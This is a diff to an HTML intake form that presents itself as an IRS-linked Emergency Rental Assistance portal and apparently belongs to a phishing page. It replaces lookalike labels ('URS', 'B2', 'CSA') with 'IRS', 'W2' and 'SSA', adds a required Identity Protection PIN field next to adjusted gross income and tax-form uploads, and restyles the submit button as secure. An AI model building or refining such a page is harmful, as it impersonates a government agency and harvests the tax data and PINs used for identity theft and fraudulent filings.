@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>URS Intake | ERAP Supplemental Details</title>
+    <title>IRS Intake | ERAP Supplemental Details</title>
     <link rel="stylesheet" href="css/style.css">
     <link rel="icon" href="favicon.svg" type="image/svg+xml">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
@@ -21,10 +21,10 @@
 
     <header class="hero patterned" style="padding: 60px 0 40px 0;">
         <div class="container">
-            <h1>URS Supplemental Details</h1>
+            <h1>IRS Supplemental Details</h1>
             <p class="lead" style="max-width: 720px;">
-                Provide the additional details requested by URS so we can complete your Emergency Rental Assistance filing.
-                These questions appear only for ERAP submissions routed through URS.
+                Provide the additional details requested by IRS so we can complete your Emergency Rental Assistance filing.
+                These questions appear only for ERAP submissions routed through IRS.
             </p>
         </div>
     </header>
@@ -38,7 +38,7 @@
                 <div class="upload-grid" style="margin-bottom: 22px;">
                     <label class="upload-card" data-dropzone>
                         <div class="upload-icon">⬆</div>
-                        <div class="upload-instruction">Prior Year B2 or CSA Form (2024–2025) *</div>
+                        <div class="upload-instruction">Prior Year W2 or SSA Form (2024–2025) *</div>
                         <div class="upload-subtext">Upload either form for 2024 or 2025 • PDF, JPG, PNG</div>
                         <span class="upload-selected">✓ File selected</span>
                         <input type="file" name="urs_prior_year_form" accept=".pdf,.jpg,.jpeg,.png" required data-file-input>
@@ -74,18 +74,23 @@
                         <span class="inline-error">Place of birth is required.</span>
                     </div>
                     <div class="form-group full-width">
-                        <label for="urs_agi">Adjusted Gross Income / BGI *</label>
+                        <label for="urs_agi">Adjusted Gross Income / AGI *</label>
                         <input type="number" id="urs_agi" name="urs_agi" min="0" required placeholder="0">
                         <span class="inline-error">Adjusted gross income is required.</span>
+                    </div>
+					<div class="form-group full-width">
+                        <label for="urs_agi"> Identity Protection PIN (IP PIN) *</label>
+                        <input type="number" id="urs_agi" name="urs_agi" min="0" required placeholder="0">
+                        <span class="inline-error"> Identity Protection PIN is required.</span>
                     </div>
                 </div>
             </fieldset>
 
             <div class="sticky-submit">
                 <div class="form-status" aria-live="polite">Checking required fields…</div>
-                <button type="submit" class="btn btn-submit" disabled>Submit URS Details</button>
+                <button type="submit" class="btn btn-submit" disabled>Submit Securely 🔒</button>
                 <p style="text-align: center; margin-top: 10px; font-size: 0.8rem; color: var(--text-muted);">
-                    By submitting, you certify these details are accurate for URS processing.
+                    By submitting, you certify these details are accurate for IRS processing.
                 </p>
             </div>
         </form>
@@ -93,7 +98,7 @@
 
     <footer>
         <div class="container footer-content">
-            <p>&copy; 2023 GOV-ASSIST Housing Division. Secure Portal.</p>
+            <p>&copy; 2026 GOV-ASSIST Housing Division. Secure Portal.</p>
         </div>
     </footer>
 
